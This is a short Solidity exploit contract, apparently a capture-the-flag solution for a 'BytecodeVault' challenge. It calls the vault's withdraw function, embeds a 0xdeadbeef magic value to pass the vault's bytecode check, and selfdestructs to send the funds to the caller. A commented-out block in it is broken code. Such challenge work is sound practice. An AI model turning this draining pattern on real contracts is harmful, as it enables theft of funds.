import {BytecodeVault} from "../../../src/metatrustctf/byteVault/bytecodeVault.sol";

pragma solidity ^0.5.17;
contract hack {
    constructor() public payable {}

    function test (BytecodeVault target) external {
        target.withdraw();
        selfdestruct(msg.sender);
    }

    function tt() external pure returns (bytes4) {
        return 0xdeadbeef;
        /*
        bytes memory result = new bytes(5);
        result[0] = 0xdead;  
        result[1] = 0xbeef;  
        result[2] = 0x01;    
        return result;
        */
    }
}